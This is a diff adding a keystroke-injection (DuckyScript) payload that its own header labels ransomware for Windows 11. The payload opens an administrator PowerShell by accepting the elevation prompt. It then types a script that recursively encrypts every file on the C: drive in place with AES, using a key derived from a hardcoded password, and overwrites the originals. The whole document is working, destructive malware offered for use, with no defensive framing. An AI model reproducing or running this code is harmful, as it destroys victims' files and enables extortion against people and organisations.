@@ -1,0 +1,150 @@
+REM #################################################
+REM #                                               #
+REM #          RANSOMWARE FOR WINDOWS 11            #
+REM #     USED AFTER LAUNCHING BACKDOOR ADMIN       #
+REM #          PASSWORD: asd@123456                 #
+REM #                                               #
+REM #################################################
+
+
+DELAY 1000
+GUI R
+DELAY 300
+STRING powershell
+DELAY 400
+CTRL ALT ENTER 
+DELAY 500
+LEFTARROW
+DELAY 600
+ENTER 
+DELAY 300
+
+
+STRING # Encrypt-CDrive.ps1
+DELAY 220
+SHIFT ENTER 
+DELAY 220
+STRING param (
+DELAY 220
+SHIFT ENTER 
+DELAY 220
+STRING [string]$DrivePath = "C:\",  # Path to the C: drive
+DELAY 300 
+SHIFT ENTER 
+DELAY 220
+STRING [string]$Password = "asd@123456"
+DELAY 250
+SHIFT ENTER 
+DELAY 200
+STRING )
+DELAY 200
+SHIFT ENTER 
+DELAY 300
+STRING # Convert the password to a byte array
+DELAY 300
+SHIFT ENTER
+DELAY 220
+STRING $Key = New-Object byte[] 32
+DELAY 220
+SHIFT ENTER 
+DELAY 220
+STRING $Rfc2898DeriveBytes = New-Object Security.Cryptography.Rfc2898DeriveBytes($Password, [byte[]](1..16), 1000)
+DELAY 400
+SHIFT ENTER
+DELAY 220
+STRING $Key = $Rfc2898DeriveBytes.GetBytes(32)
+DELAY 220
+SHIFT ENTER 
+DELAY 220
+STRING # Encrypt each file in the C: drive and subfolders
+DELAY 220
+SHIFT ENTER 
+DELAY 220
+STRING Get-ChildItem -Path $DrivePath -Recurse -File | ForEach-Object {
+DELAY 300
+SHIFT ENTER 
+DELAY 220
+STRING $FilePath = $_.FullName
+DELAY 200
+SHIFT ENTER 
+DELAY 220
+STRING # Generate an IV (Initialization Vector)
+DELAY 220
+SHIFT ENTER 
+DELAY 220
+STRING $IV = New-Object byte[] 16
+DELAY 220
+SHIFT ENTER 
+DELAY 220
+STRING [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($IV)
+DELAY 220
+SHIFT ENTER
+DELAY 220
+STRING # Read the content of the file
+DELAY 220
+SHIFT ENTER 
+DELAY 220
+STRING $PlainText = [System.IO.File]::ReadAllBytes($FilePath)
+DELAY 250 
+SHIFT ENTER 
+DELAY 220
+STRING # Encrypt the content
+DELAY 200
+SHIFT ENTER 
+DELAY 220
+STRING $Aes = [System.Security.Cryptography.AesManaged]::Create()
+DELAY 300
+SHIFT ENTER 
+DELAY 220
+STRING $Aes.Key = $Key
+DELAY 200
+SHIFT ENTER 
+DELAY 220
+STRING $Aes.IV = $IV
+DELAY 200
+SHIFT ENTER 
+DELAY 220
+STRING $Encryptor = $Aes.CreateEncryptor()
+DELAY 190 
+SHIFT ENTER 
+DELAY 220
+STRING $EncryptedBytes = $Encryptor.TransformFinalBlock($PlainText, 0, $PlainText.Length)
+DELAY 350
+SHIFT ENTER 
+DELAY 220
+STRING # Save the IV and encrypted content back to the original file
+DELAY 250 
+SHIFT ENTER
+DELAY 220
+STRING [System.IO.File]::WriteAllBytes($FilePath, $IV + $EncryptedBytes)
+DELAY 300
+SHIFT ENTER 
+DELAY 220
+STRING Write-Host "File encrypted successfully: $FilePath"
+DELAY 250
+SHIFT ENTER 
+DELAY 220
+STRING }
+DELAY 100
+SHIFT ENTER
+DELAY 220
+STRING Write-Host "All files on the C: drive have been encrypted successfully!"
+DELAY 250
+SHIFT ENTER 
+DELAY 220
+STRING Write-Host "Use this password for decryption: $Password"
+DELAY 250
+ENTER
+
+
+    
+
+
+    
+
+    
+    
+
+   
+
+
